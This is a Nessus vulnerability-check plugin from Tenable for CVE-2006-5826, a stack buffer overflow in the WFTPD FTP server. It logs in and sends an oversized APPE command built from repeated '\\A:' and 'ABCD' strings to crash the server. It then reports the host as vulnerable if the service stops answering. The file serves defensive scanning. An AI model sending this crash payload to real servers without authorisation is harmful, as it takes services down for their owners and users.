#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24671);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-5826");
  script_bugtraq_id(20942);
  script_xref(name:"OSVDB", value:"31243");
 
  script_name(english:"WFTPD APPE Command Buffer Overflow");
  script_summary(english:"Checks for appe command buffer overflow vulnerability in WFTPD");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using WFTPD, an FTP server for Windows. 

The version of WFTPD installed on the remote host contains a stack-
based buffer overflow vulnerability that can be exploited by an
authenticated, possibly anonymous, user with a specially-crafted APPE
command to crash the affected application or execute arbitrary code on
the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-11/0109.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:M/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
 
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Make sure the banner indicates it's WFTPD.
banner = get_ftp_banner(port:port);
if (!banner || "by Texas Imperial Software" >!< banner) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  close(soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Try to exploit the flaw to crash the daemon.
c = "APPE ";
for (i=1; i<=64; i++) c += '\\\\A:';
for (i=1; i<=116; i++) c += 'ABCD';
c += "JOXEAN";
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if (!isnull(s)) exit(0);


# The server doesn't crash right away so try for a bit to open a connection.
failed = 0;
tries = 5;
for (iter=0; iter<=tries; iter++)
{
  soc = http_open_socket(port);
  if (soc)
  {
    failed = 0;
    close(soc);
    sleep(5);
  }
  else
  {
    failed++;
    if (failed > 1)
    {
      security_warning(port);
      exit(0);
    }
  }
}
